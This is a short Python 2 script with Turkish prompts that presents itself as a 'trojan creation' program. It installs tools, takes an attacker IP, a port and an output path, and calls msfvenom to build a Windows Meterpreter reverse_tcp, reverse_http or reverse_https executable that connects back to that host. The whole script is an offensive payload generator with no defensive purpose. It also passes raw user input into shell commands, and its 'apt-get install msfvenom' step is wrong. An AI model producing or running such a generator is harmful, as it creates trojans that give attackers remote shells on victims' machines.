#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("apt-get install msfvenom")
os.system("clear")
os.system("figlet Trojan Olusturma")

print("Trojan Olusturma Programina Hos Geldiniz.")

ip = raw_input("Local veya Dis IP Girin: ")
port = raw_input("Port No Girin: ")
print("""
Payload Listesi

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")

payload = raw_input("Payload No Girin: ")
kayityeri = raw_input("Kayit Yeri: ")

if(payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
if(payload == "2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
if(payload == "3"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
